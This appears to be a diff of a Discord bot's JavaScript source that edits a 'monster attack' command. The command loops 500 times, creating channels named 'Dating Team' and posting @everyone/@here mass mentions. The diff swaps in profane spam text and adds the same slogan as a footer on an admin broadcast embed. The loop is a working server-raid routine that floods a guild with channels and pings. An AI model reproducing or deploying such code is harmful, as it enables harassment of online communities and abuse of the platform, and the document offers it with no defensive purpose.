@@ -17,7 +17,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel(' Dating Team ', 'text')
-        message.channel.send('@everyone Dating Team @here');
+        message.channel.send('@everyone __**Dating Team Is The Best Bitches**__ :muscle: :v: @here');
 }
 }
 });   
@@ -124,6 +124,7 @@ return;
    if(!message.member.hasPermission('ADMINISTRATOR')) return;
             var bc = new Discord.RichEmbed()
             .addField(' » message : ', args)
+            .setFooter('__**Dating Team Is The Best Bitches**__ :muscle: :v:')
             .setColor('#ff0000')
             // m.send(`[${m}]`);
             m.send(`${m}`,{embed: bc});
